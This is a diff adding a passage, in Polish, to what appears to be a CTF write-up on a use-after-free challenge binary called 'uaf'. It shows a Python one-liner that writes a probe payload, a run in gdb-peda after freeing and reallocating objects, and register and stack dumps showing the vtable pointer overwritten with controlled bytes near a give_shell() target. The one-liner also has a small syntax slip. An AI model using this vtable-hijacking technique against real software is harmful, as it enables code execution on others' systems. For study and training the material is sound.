@@ -171,3 +171,75 @@ Legend: code, data, rodata, value
 
 Breakpoint 1, 0x0000000000400fd4 in main ()
 ```
+* Kolejna instrukcja: `0x400fd4 <main+272>:	add    rax,0x8`, do adresu `give_shell()` dodaje 8, co powoduje zmianę wskaźnika z `give_shell()` na metodę `Man::introduce()`
+* Wiedząc mniej więcej jak wygląda struktura obiektu w pamięci (różnica 8 pomiędzy wskaźnikami do metod) możemy eksperymentalnie sprawdzić co się stanie w momencie załadowania śmieci do pamięci, za pomocą opcji menu `2. after`. Dla mnie najprościej jest stworzyć taki plik za pomocą pythona: `python -c 'print ("\x41"*6 + "\x42"*6 + "\x43"*6 "\x44"*6)' > uaf_test`. Jeżeli wymagamy aby payload miał unikalne bajty można skorzystać z funkcji `cyclic()` pochodzącej z `pwntools`.
+* Uruchamiamy binarkę: `./uaf 24 uaf_test` np. w gdb i sprawdzamy co się dzieje w poprzednim breakpoincie (oczywiście po **DWUKROTNYM** usunięciu obiektów i załadowaniu pliku do pamięci). Dlaczego dwukrotnym? Bo na początku zadania są tworzone dwa obiekty i również potrzebujemy odworzyć dwa obiekty (plik ma strukturę tylko jednego):
+```
+gdb-peda$ r 24 uaf_test 
+Starting program: uaf 24 uaf_test
+1. use
+2. after
+3. free
+3
+1. use
+2. after
+3. free
+3
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+1
+
+ [----------------------------------registers-----------------------------------]
+RAX: 0x4242414141414141 ('AAAAAABB')
+RBX: 0x614ca0 ("AAAAAABBBBBBCCCCCCDDDDDD\021\004")
+RCX: 0x0 
+RDX: 0x7fffffffdb48 --> 0x1 
+RSI: 0x0 
+RDI: 0x7ffff7dd6140 --> 0x0 
+RBP: 0x7fffffffdb60 --> 0x4013b0 (<__libc_csu_init>:	mov    QWORD PTR [rsp-0x28],rbp)
+RSP: 0x7fffffffdb00 --> 0x7fffffffdc48 --> 0x7fffffffe064 ("uaf")
+RIP: 0x400fd4 (<main+272>:	add    rax,0x8)
+R8 : 0x7ffff78398e0 --> 0xfbad2288 
+R9 : 0x7ffff783b790 --> 0x0 
+R10: 0x7ffff7fba740 (0x00007ffff7fba740)
+R11: 0x246 
+R12: 0x7fffffffdb20 --> 0x614c88 --> 0x6c6c694a ('Jill')
+R13: 0x7fffffffdc40 --> 0x3 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x400fc8 <main+260>:	jmp    0x4010a9 <main+485>
+   0x400fcd <main+265>:	mov    rax,QWORD PTR [rbp-0x38]
+   0x400fd1 <main+269>:	mov    rax,QWORD PTR [rax]
+=> 0x400fd4 <main+272>:	add    rax,0x8
+   0x400fd8 <main+276>:	mov    rdx,QWORD PTR [rax]
+   0x400fdb <main+279>:	mov    rax,QWORD PTR [rbp-0x38]
+   0x400fdf <main+283>:	mov    rdi,rax
+   0x400fe2 <main+286>:	call   rdx
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdb00 --> 0x7fffffffdc48 --> 0x7fffffffe064 ("uaf")
+0008| 0x7fffffffdb08 --> 0x30000ffff 
+0016| 0x7fffffffdb10 --> 0x614c38 --> 0x6b63614a ('Jack')
+0024| 0x7fffffffdb18 --> 0x401177 (<_GLOBAL__sub_I_main+19>:	pop    rbp)
+0032| 0x7fffffffdb20 --> 0x614c88 --> 0x6c6c694a ('Jill')
+0040| 0x7fffffffdb28 --> 0x614c50 ("AAAAAABBBBBBCCCCCCDDDDDD1")
+0048| 0x7fffffffdb30 --> 0x614ca0 ("AAAAAABBBBBBCCCCCCDDDDDD\021\004")
+0056| 0x7fffffffdb38 --> 0x18 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0000000000400fd4 in main ()
+
+```
